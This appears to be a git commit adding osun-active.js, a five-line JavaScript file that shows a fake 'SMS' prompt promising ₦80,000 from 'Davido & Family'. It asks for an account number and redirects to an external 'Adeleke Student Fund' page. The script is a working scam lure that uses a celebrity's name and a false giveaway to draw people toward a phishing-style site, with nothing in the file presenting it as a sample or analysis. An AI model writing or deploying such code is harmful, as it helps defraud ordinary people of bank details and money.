6a90663c73476d13e6ecd355ed2dafdc4e862a61
help0z <triplerain29@gmail.com>
2026-08-16 15:59:44 +0100

    Create osun-active.js

---
+++ osun-active.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW ₦80,000'
+password=prompt('SMS: Congratulations, you are eligible to receive ₦80,000 From Davido & Family, click OK to Enter Your Acc. Number','WITHDRAW ₦80,000');
+if (password != 'WITHDRAW ₦80,000') {
+location.href='https://gmoni.info/80k-Adeleke-Student-Fund.html';
+}
